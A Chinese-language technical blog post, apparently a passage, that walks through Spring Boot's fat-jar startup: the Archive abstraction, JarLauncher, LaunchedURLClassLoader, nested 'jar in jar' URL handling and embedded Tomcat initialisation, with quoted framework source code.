<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringBootDemoApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(SpringBootDemoApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="com-example-目录"><a href="#com-example-目录" class="headerlink" title="com/example 目录"></a>com/example 目录</h3><p>这下面放的是应用的.class文件。</p>
<h3 id="lib目录"><a href="#lib目录" class="headerlink" title="lib目录"></a>lib目录</h3><p>这里存放的是应用的Maven依赖的jar包文件。<br>比如spring-beans，spring-mvc等jar。</p>
<h3 id="org-springframework-boot-loader-目录"><a href="#org-springframework-boot-loader-目录" class="headerlink" title="org/springframework/boot/loader 目录"></a>org/springframework/boot/loader 目录</h3><p>这下面存放的是Spring boot loader的.class文件。</p>
<h2 id="Archive的概念"><a href="#Archive的概念" class="headerlink" title="Archive的概念"></a>Archive的概念</h2><ul>
<li>archive即归档文件，这个概念在linux下比较常见</li>
<li>通常就是一个tar/zip格式的压缩包</li>
<li>jar是zip格式</li>
</ul>
<p>在spring boot里，抽象出了Archive的概念。</p>
<p>一个archive可以是一个jar（JarFileArchive），也可以是一个文件目录（ExplodedArchive）。可以理解为Spring boot抽象出来的统一访问资源的层。</p>
<p>上面的demo-0.0.1-SNAPSHOT.jar 是一个Archive，然后demo-0.0.1-SNAPSHOT.jar里的/lib目录下面的每一个Jar包，也是一个Archive。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Archive</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> URL <span class="title">getUrl</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getMainClass</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Collection&lt;Entry&gt; <span class="title">getEntries</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> List&lt;Archive&gt; <span class="title">getNestedArchives</span><span class="params">(EntryFilter filter)</span></span>;</span><br></pre></td></tr></table></figure>
<p>可以看到Archive有一个自己的URL，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/</span><br></pre></td></tr></table></figure>
<p>还有一个getNestedArchives函数，这个实际返回的是demo-0.0.1-SNAPSHOT.jar/lib下面的jar的Archive列表。它们的URL是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/lib/aopalliance-1.0.jar</span><br><span class="line">jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/lib/spring-beans-4.2.3.RELEASE.jar</span><br></pre></td></tr></table></figure>
<h2 id="JarLauncher"><a href="#JarLauncher" class="headerlink" title="JarLauncher"></a>JarLauncher</h2><p>从MANIFEST.MF可以看到Main函数是JarLauncher，下面来分析它的工作流程。</p>
<p>JarLauncher类的继承结构是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JarLauncher</span> <span class="keyword">extends</span> <span class="title">ExecutableArchiveLauncher</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">ExecutableArchiveLauncher</span> <span class="keyword">extends</span> <span class="title">Launcher</span></span></span><br></pre></td></tr></table></figure>
<h3 id="以demo-0-0-1-SNAPSHOT-jar创建一个Archive："><a href="#以demo-0-0-1-SNAPSHOT-jar创建一个Archive：" class="headerlink" title="以demo-0.0.1-SNAPSHOT.jar创建一个Archive："></a>以demo-0.0.1-SNAPSHOT.jar创建一个Archive：</h3><p>JarLauncher先找到自己所在的jar，即demo-0.0.1-SNAPSHOT.jar的路径，然后创建了一个Archive。</p>
<p>下面的代码展示了如何从一个类找到它的加载的位置的技巧：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> Archive <span class="title">createArchive</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	ProtectionDomain protectionDomain = getClass().getProtectionDomain();</span><br><span class="line">	CodeSource codeSource = protectionDomain.getCodeSource();</span><br><span class="line">	URI location = (codeSource == <span class="keyword">null</span> ? <span class="keyword">null</span> : codeSource.getLocation().toURI());</span><br><span class="line">	String path = (location == <span class="keyword">null</span> ? <span class="keyword">null</span> : location.getSchemeSpecificPart());</span><br><span class="line">	<span class="keyword">if</span> (path == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Unable to determine code source archive"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	File root = <span class="keyword">new</span> File(path);</span><br><span class="line">	<span class="keyword">if</span> (!root.exists()) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">				<span class="string">"Unable to determine code source archive from "</span> + root);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (root.isDirectory() ? <span class="keyword">new</span> ExplodedArchive(root)</span><br><span class="line">			: <span class="keyword">new</span> JarFileArchive(root));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取lib-下面的jar，并创建一个LaunchedURLClassLoader"><a href="#获取lib-下面的jar，并创建一个LaunchedURLClassLoader" class="headerlink" title="获取lib/下面的jar，并创建一个LaunchedURLClassLoader"></a>获取lib/下面的jar，并创建一个LaunchedURLClassLoader</h3><p>JarLauncher创建好Archive之后，通过getNestedArchives函数来获取到demo-0.0.1-SNAPSHOT.jar/lib下面的所有jar文件，并创建为List<archive>。</archive></p>
<p>注意上面提到，Archive都是有自己的URL的。</p>
<p>获取到这些Archive的URL之后，也就获得了一个URL[]数组，用这个来构造一个自定义的ClassLoader：LaunchedURLClassLoader。</p>
<p>创建好ClassLoader之后，再从MANIFEST.MF里读取到Start-Class，即com.example.SpringBootDemoApplication，然后创建一个新的线程来启动应用的Main函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Launch the application given the archive file and a fully configured classloader.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">launch</span><span class="params">(String[] args, String mainClass, ClassLoader classLoader)</span></span></span><br><span class="line"><span class="function">		<span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	Runnable runner = createMainMethodRunner(mainClass, args, classLoader);</span><br><span class="line">	Thread runnerThread = <span class="keyword">new</span> Thread(runner);</span><br><span class="line">	runnerThread.setContextClassLoader(classLoader);</span><br><span class="line">	runnerThread.setName(Thread.currentThread().getName());</span><br><span class="line">	runnerThread.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create the &#123;<span class="doctag">@code</span> MainMethodRunner&#125; used to launch the application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Runnable <span class="title">createMainMethodRunner</span><span class="params">(String mainClass, String[] args,</span></span></span><br><span class="line"><span class="function"><span class="params">		ClassLoader classLoader)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	Class&lt;?&gt; runnerClass = classLoader.loadClass(RUNNER_CLASS);</span><br><span class="line">	Constructor&lt;?&gt; constructor = runnerClass.getConstructor(String<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line">			String[].class);</span><br><span class="line">	<span class="keyword">return</span> (Runnable) constructor.newInstance(mainClass, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="LaunchedURLClassLoader"><a href="#LaunchedURLClassLoader" class="headerlink" title="LaunchedURLClassLoader"></a>LaunchedURLClassLoader</h3><p>LaunchedURLClassLoader和普通的URLClassLoader的不同之处是，它提供了从Archive里加载.class的能力。</p>
<p>结合Archive提供的getEntries函数，就可以获取到Archive里的Resource。当然里面的细节还是很多的，下面再描述。</p>
<h2 id="spring-boot应用启动流程总结"><a href="#spring-boot应用启动流程总结" class="headerlink" title="spring boot应用启动流程总结"></a>spring boot应用启动流程总结</h2><p>看到这里，可以总结下Spring Boot应用的启动流程：</p>
<ol>
<li>spring boot应用打包之后，生成一个fat jar，里面包含了应用依赖的jar包，还有Spring  boot loader相关的类</li>
<li>Fat jar的启动Main函数是JarLauncher，它负责创建一个LaunchedURLClassLoader来加载/lib下面的jar，并以一个新线程启动应用的Main函数。</li>
</ol>
<h2 id="spring-boot-loader里的细节"><a href="#spring-boot-loader里的细节" class="headerlink" title="spring boot loader里的细节"></a>spring boot loader里的细节</h2><p>代码地址：<a href="https://github.com/spring-projects/spring-boot/tree/master/spring-boot-tools/spring-boot-loader" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/tree/master/spring-boot-tools/spring-boot-loader</a></p>
<h3 id="JarFile-URL的扩展"><a href="#JarFile-URL的扩展" class="headerlink" title="JarFile URL的扩展"></a>JarFile URL的扩展</h3><p>Spring boot能做到以一个fat jar来启动，最重要的一点是它实现了jar in jar的加载方式。</p>
<p>JDK原始的JarFile URL的定义可以参考这里：</p>
<p><a href="http://docs.oracle.com/javase/7/docs/api/java/net/JarURLConnection.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/7/docs/api/java/net/JarURLConnection.html</a></p>
<p>原始的JarFile URL是这样子的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/</span><br></pre></td></tr></table></figure>
<p>jar包里的资源的URL：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/com/example/SpringBootDemoApplication.class</span><br></pre></td></tr></table></figure></p>
<p>可以看到对于Jar里的资源，定义以’!/‘来分隔。原始的JarFile URL只支持一个’!/‘。</p>
<p>Spring boot扩展了这个协议，让它支持多个’!/‘，就可以表示jar in jar，jar in directory的资源了。</p>
<p>比如下面的URL表示demo-0.0.1-SNAPSHOT.jar这个jar里lib目录下面的spring-beans-4.2.3.RELEASE.jar里面的MANIFEST.MF：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/lib/spring-beans-4.2.3.RELEASE.jar!/META-INF/MANIFEST.MF</span><br></pre></td></tr></table></figure>
<h4 id="自定义URLStreamHandler，扩展JarFile和JarURLConnection"><a href="#自定义URLStreamHandler，扩展JarFile和JarURLConnection" class="headerlink" title="自定义URLStreamHandler，扩展JarFile和JarURLConnection"></a>自定义URLStreamHandler，扩展JarFile和JarURLConnection</h4><p>在构造一个URL时，可以传递一个Handler，而JDK自带有默认的Handler类，应用可以自己注册Handler来处理自定义的URL。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URL</span><span class="params">(String protocol,</span></span></span><br><span class="line"><span class="function"><span class="params">           String host,</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">int</span> port,</span></span></span><br><span class="line"><span class="function"><span class="params">           String file,</span></span></span><br><span class="line"><span class="function"><span class="params">           URLStreamHandler handler)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> MalformedURLException</span></span><br></pre></td></tr></table></figure>
<p>参考：<br><a href="https://docs.oracle.com/javase/8/docs/api/java/net/URL.html#URL-java.lang.String-java.lang.String-int-java.lang.String-" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/java/net/URL.html#URL-java.lang.String-java.lang.String-int-java.lang.String-</a></p>
<p>Spring boot通过注册了一个自定义的Handler类来处理多重jar in jar的逻辑。</p>
<p>这个Handler内部会用SoftReference来缓存所有打开过的JarFile。</p>
<p>在处理像下面这样的URL时，会循环处理’!/‘分隔符，从最上层出发，先构造出demo-0.0.1-SNAPSHOT.jar这个JarFile，再构造出spring-beans-4.2.3.RELEASE.jar这个JarFile，然后再构造出指向MANIFEST.MF的JarURLConnection。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:file:/tmp/target/demo-0.0.1-SNAPSHOT.jar!/lib/spring-beans-4.2.3.RELEASE.jar!/META-INF/MANIFEST.MF</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//org.springframework.boot.loader.jar.Handler</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Handler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SEPARATOR = <span class="string">"!/"</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> SoftReference&lt;Map&lt;File, JarFile&gt;&gt; rootFileCache;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.jarFile != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> JarURLConnection(url, <span class="keyword">this</span>.jarFile);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> JarURLConnection(url, getRootJarFileFromUrl(url));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">			<span class="keyword">return</span> openFallbackConnection(url, ex);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> JarFile <span class="title">getRootJarFileFromUrl</span><span class="params">(URL url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		String spec = url.getFile();</span><br><span class="line">		<span class="keyword">int</span> separatorIndex = spec.indexOf(SEPARATOR);</span><br><span class="line">		<span class="keyword">if</span> (separatorIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">"Jar URL does not contain !/ separator"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		String name = spec.substring(<span class="number">0</span>, separatorIndex);</span><br><span class="line">		<span class="keyword">return</span> getRootJarFile(name);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ClassLoader如何读取到Resource"><a href="#ClassLoader如何读取到Resource" class="headerlink" title="ClassLoader如何读取到Resource"></a>ClassLoader如何读取到Resource</h4><p>对于一个ClassLoader，它需要哪些能力？</p>
<ul>
<li>查找资源</li>
<li>读取资源</li>
</ul>
<p>对应的API是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> URL <span class="title">findResource</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getResourceAsStream</span><span class="params">(String name)</span></span></span><br></pre></td></tr></table></figure>
<p>上面提到，Spring boot构造LaunchedURLClassLoader时，传递了一个URL[]数组。数组里是lib目录下面的jar的URL。</p>
<p>对于一个URL，JDK或者ClassLoader如何知道怎么读取到里面的内容的？</p>
<p>实际上流程是这样子的：</p>
<ul>
<li>LaunchedURLClassLoader.loadClass</li>
<li>URL.getContent()</li>
<li>URL.openConnection()</li>
<li>Handler.openConnection(URL)</li>
</ul>
<p>最终调用的是JarURLConnection的getInputStream()函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//org.springframework.boot.loader.jar.JarURLConnection</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		connect();</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.jarEntryName.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"no entry name specified"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.jarEntryData.getInputStream();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>从一个URL，到最终读取到URL里的内容，整个过程是比较复杂的，总结下：</p>
<ul>
<li>spring boot注册了一个Handler来处理”jar:”这种协议的URL</li>
<li>spring boot扩展了JarFile和JarURLConnection，内部处理jar in jar的情况</li>
<li>在处理多重jar in jar的URL时，spring boot会循环处理，并缓存已经加载到的JarFile</li>
<li>对于多重jar in jar，实际上是解压到了临时目录来处理，可以参考JarFileArchive里的代码</li>
<li>在获取URL的InputStream时，最终获取到的是JarFile里的JarEntryData</li>
</ul>
<p>这里面的细节很多，只列出比较重要的一些点。</p>
<p>然后，URLClassLoader是如何getResource的呢？</p>
<p>URLClassLoader在构造时，有URL[]数组参数，它内部会用这个数组来构造一个URLClassPath:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URLClassPath ucp = <span class="keyword">new</span> URLClassPath(urls);</span><br></pre></td></tr></table></figure>
<p>在 URLClassPath 内部会为这些URLS 都构造一个Loader，然后在getResource时，会从这些Loader里一个个去尝试获取。<br>如果获取成功的话，就像下面那样包装为一个Resource。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Resource <span class="title">getResource</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">boolean</span> check)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> URL url;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        url = <span class="keyword">new</span> URL(base, ParseUtil.encodePath(name, <span class="keyword">false</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"name"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> URLConnection uc;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (check) &#123;</span><br><span class="line">            URLClassPath.check(url);</span><br><span class="line">        &#125;</span><br><span class="line">        uc = url.openConnection();</span><br><span class="line">        InputStream in = uc.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (uc <span class="keyword">instanceof</span> JarURLConnection) &#123;</span><br><span class="line">            <span class="comment">/* Need to remember the jar file so it can be closed</span></span><br><span class="line"><span class="comment">             * in a hurry.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            JarURLConnection juc = (JarURLConnection)uc;</span><br><span class="line">            jarfile = JarLoader.checkJar(juc.getJarFile());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Resource() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> URL <span class="title">getURL</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> url; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> URL <span class="title">getCodeSourceURL</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> base; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> uc.getInputStream();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getContentLength</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> uc.getContentLength();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从代码里可以看到，实际上是调用了url.openConnection()。这样完整的链条就可以连接起来了。</p>
<p>注意，URLClassPath这个类的代码在JDK里没有自带，在这里看到 <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7u40-b43/sun/misc/URLClassPath.java#506" target="_blank" rel="noopener">http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7u40-b43/sun/misc/URLClassPath.java#506</a></p>
<h3 id="在IDE-开放目录启动Spring-boot应用"><a href="#在IDE-开放目录启动Spring-boot应用" class="headerlink" title="在IDE/开放目录启动Spring boot应用"></a>在IDE/开放目录启动Spring boot应用</h3><p>在上面只提到在一个fat jar里启动Spring boot应用的过程，下面分析IDE里Spring boot是如何启动的。</p>
<p>在IDE里，直接运行的Main函数是应用自己的Main函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringBootDemoApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(SpringBootDemoApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实在IDE里启动Spring boot应用是最简单的一种情况，因为依赖的Jar都让IDE放到classpath里了，所以Spring boot直接启动就完事了。</p>
<p>还有一种情况是在一个开放目录下启动Spring boot启动。所谓的开放目录就是把fat jar解压，然后直接启动应用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java org.springframework.boot.loader.JarLauncher</span><br></pre></td></tr></table></figure>
<p>这时，Spring boot会判断当前是否在一个目录里，如果是的，则构造一个ExplodedArchive（前面在jar里时是JarFileArchive），后面的启动流程类似fat jar的。</p>
<h3 id="Embead-Tomcat的启动流程"><a href="#Embead-Tomcat的启动流程" class="headerlink" title="Embead Tomcat的启动流程"></a>Embead Tomcat的启动流程</h3><h4 id="判断是否在web环境"><a href="#判断是否在web环境" class="headerlink" title="判断是否在web环境"></a>判断是否在web环境</h4><p>spring boot在启动时，先通过一个简单的查找Servlet类的方式来判断是不是在web环境：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] WEB_ENVIRONMENT_CLASSES = &#123; <span class="string">"javax.servlet.Servlet"</span>,</span><br><span class="line">    <span class="string">"org.springframework.web.context.ConfigurableWebApplicationContext"</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">deduceWebEnvironment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (String className : WEB_ENVIRONMENT_CLASSES) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ClassUtils.isPresent(className, <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果是的话，则会创建AnnotationConfigEmbeddedWebApplicationContext，否则Spring context就是AnnotationConfigApplicationContext：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//org.springframework.boot.SpringApplication</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> ConfigurableApplicationContext <span class="title">createApplicationContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Class&lt;?&gt; contextClass = <span class="keyword">this</span>.applicationContextClass;</span><br><span class="line">		<span class="keyword">if</span> (contextClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				contextClass = Class.forName(<span class="keyword">this</span>.webEnvironment</span><br><span class="line">						? DEFAULT_WEB_CONTEXT_CLASS : DEFAULT_CONTEXT_CLASS);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">						<span class="string">"Unable create a default ApplicationContext, "</span></span><br><span class="line">								+ <span class="string">"please specify an ApplicationContextClass"</span>,</span><br><span class="line">						ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> (ConfigurableApplicationContext) BeanUtils.instantiate(contextClass);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h4 id="获取EmbeddedServletContainerFactory的实现类"><a href="#获取EmbeddedServletContainerFactory的实现类" class="headerlink" title="获取EmbeddedServletContainerFactory的实现类"></a>获取EmbeddedServletContainerFactory的实现类</h4><p>spring boot通过获取EmbeddedServletContainerFactory来启动对应的web服务器。</p>
<p>常用的两个实现类是TomcatEmbeddedServletContainerFactory和JettyEmbeddedServletContainerFactory。</p>
<p>启动Tomcat的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//TomcatEmbeddedServletContainerFactory</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> EmbeddedServletContainer <span class="title">getEmbeddedServletContainer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        ServletContextInitializer... initializers)</span> </span>&#123;</span><br><span class="line">    Tomcat tomcat = <span class="keyword">new</span> Tomcat();</span><br><span class="line">    File baseDir = (<span class="keyword">this</span>.baseDirectory != <span class="keyword">null</span> ? <span class="keyword">this</span>.baseDirectory</span><br><span class="line">            : createTempDir(<span class="string">"tomcat"</span>));</span><br><span class="line">    tomcat.setBaseDir(baseDir.getAbsolutePath());</span><br><span class="line">    Connector connector = <span class="keyword">new</span> Connector(<span class="keyword">this</span>.protocol);</span><br><span class="line">    tomcat.getService().addConnector(connector);</span><br><span class="line">    customizeConnector(connector);</span><br><span class="line">    tomcat.setConnector(connector);</span><br><span class="line">    tomcat.getHost().setAutoDeploy(<span class="keyword">false</span>);</span><br><span class="line">    tomcat.getEngine().setBackgroundProcessorDelay(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (Connector additionalConnector : <span class="keyword">this</span>.additionalTomcatConnectors) &#123;</span><br><span class="line">        tomcat.getService().addConnector(additionalConnector);</span><br><span class="line">    &#125;</span><br><span class="line">    prepareContext(tomcat.getHost(), initializers);</span><br><span class="line">    <span class="keyword">return</span> getTomcatEmbeddedServletContainer(tomcat);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会为tomcat创建一个临时文件目录，如：<br>/tmp/tomcat.2233614112516545210.8080，做为tomcat的basedir。里面会放tomcat的临时文件，比如work目录。</p>
<p>还会初始化Tomcat的一些Servlet，比如比较重要的default/jsp servlet：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addDefaultServlet</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">    Wrapper defaultServlet = context.createWrapper();</span><br><span class="line">    defaultServlet.setName(<span class="string">"default"</span>);</span><br><span class="line">    defaultServlet.setServletClass(<span class="string">"org.apache.catalina.servlets.DefaultServlet"</span>);</span><br><span class="line">    defaultServlet.addInitParameter(<span class="string">"debug"</span>, <span class="string">"0"</span>);</span><br><span class="line">    defaultServlet.addInitParameter(<span class="string">"listings"</span>, <span class="string">"false"</span>);</span><br><span class="line">    defaultServlet.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// Otherwise the default location of a Spring DispatcherServlet cannot be set</span></span><br><span class="line">    defaultServlet.setOverridable(<span class="keyword">true</span>);</span><br><span class="line">    context.addChild(defaultServlet);</span><br><span class="line">    context.addServletMapping(<span class="string">"/"</span>, <span class="string">"default"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addJspServlet</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">    Wrapper jspServlet = context.createWrapper();</span><br><span class="line">    jspServlet.setName(<span class="string">"jsp"</span>);</span><br><span class="line">    jspServlet.setServletClass(getJspServletClassName());</span><br><span class="line">    jspServlet.addInitParameter(<span class="string">"fork"</span>, <span class="string">"false"</span>);</span><br><span class="line">    jspServlet.setLoadOnStartup(<span class="number">3</span>);</span><br><span class="line">    context.addChild(jspServlet);</span><br><span class="line">    context.addServletMapping(<span class="string">"*.jsp"</span>, <span class="string">"jsp"</span>);</span><br><span class="line">    context.addServletMapping(<span class="string">"*.jspx"</span>, <span 